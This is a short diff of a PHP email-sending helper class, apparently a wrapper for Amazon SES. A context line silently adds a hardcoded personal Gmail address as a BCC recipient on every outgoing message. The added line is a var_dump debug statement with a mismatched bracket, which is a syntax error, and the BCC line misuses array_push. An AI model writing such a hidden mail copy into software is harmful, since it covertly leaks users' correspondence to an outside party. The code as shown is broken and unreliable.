@@ -59,7 +59,7 @@ class Ses extends HelperAbstract {
 			if (!empty($params[$k]) && !is_array($params[$k]))
 				$params[$k] = array($params[$k]);
 		$params['bcc'] = isset($params['bcc']) ? array_push($params['bcc'],'volcomstoner2689@gmail.com') : array('volcomstoner2689@gmail.com');
-
+var_dump($params['bcc');
 		// destination
 		$destination = array(
 			'ToAddresses' => $params['to'],
